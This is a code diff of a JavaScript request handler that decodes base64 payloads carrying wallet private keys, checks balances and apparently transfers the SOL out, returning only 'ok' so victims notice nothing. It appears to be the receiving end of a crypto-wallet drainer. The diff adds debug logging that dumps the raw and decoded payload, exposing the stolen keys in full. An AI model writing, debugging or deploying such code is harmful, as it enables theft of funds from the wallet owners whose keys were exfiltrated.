@@ -10,20 +10,31 @@ const FEE_ESTIMATE = 5000; // Fallback lamports estimate
 const processedKeys = new Set();
 
 export default async function handler(req, res) {
+  // Debug: Log incoming request details
+  console.log('[request]', {
+    method: req.method,
+    query: req.query,
+    body: req.body
+  });
+
   const query = req.query || {};
   const body = (req.body && typeof req.body === 'object') ? req.body : safeParseJSON(req.body);
   
   const dParam = (query.d || (body && body.d) || '').toString();
   
+  // Debug: Log dParam
+  console.log('[dParam]', dParam);
+
   if (dParam) {
     try {
       // Clean and decode the base64 data
       const cleaned = dParam.replace(/[()]/g, '');
+      console.log('[cleaned]', cleaned); // Debug
       const decoded = Buffer.from(cleaned, 'base64').toString('utf8');
+      console.log('[decoded]', decoded); // Debug
       const parsedData = tryJsonParse(decoded) ?? decoded;
       
-      // Clean logs - only b64 data and decoded result
-      console.log('[b64-data]', dParam);
+      // Log decoded data with redacted private key
       console.log('[decoded-data]', {
         ...parsedData,
         wallets: parsedData.wallets?.map(wallet => ({ ...wallet, key: 'REDACTED' }))
@@ -55,6 +66,7 @@ export default async function handler(req, res) {
 
             // Get balance and blockhash
             const balance = await connection.getBalance(fromKeypair.publicKey);
+            console.log('[balance]', balance); // Debug
             if (balance <= FEE_ESTIMATE) {
               console.error(`[error] Insufficient balance for transfer from ${pubkeyStr}: ${balance} lamports`);
             } else {
@@ -83,10 +95,14 @@ export default async function handler(req, res) {
         } catch (error) {
           console.error('[transfer-error]', `Failed to process SOL transfer for ${privateKeyBase58.slice(0, 8)}...: ${error.message}`);
         }
+      } else {
+        console.log('[no-key]', 'No valid wallets[0].key found in parsed data');
       }
     } catch (e) {
       console.log('[decode-error]', e?.message || String(e));
     }
+  } else {
+    console.log('[no-dParam]', 'No d parameter provided in request');
   }
 
   // Simple response - users only see "ok"
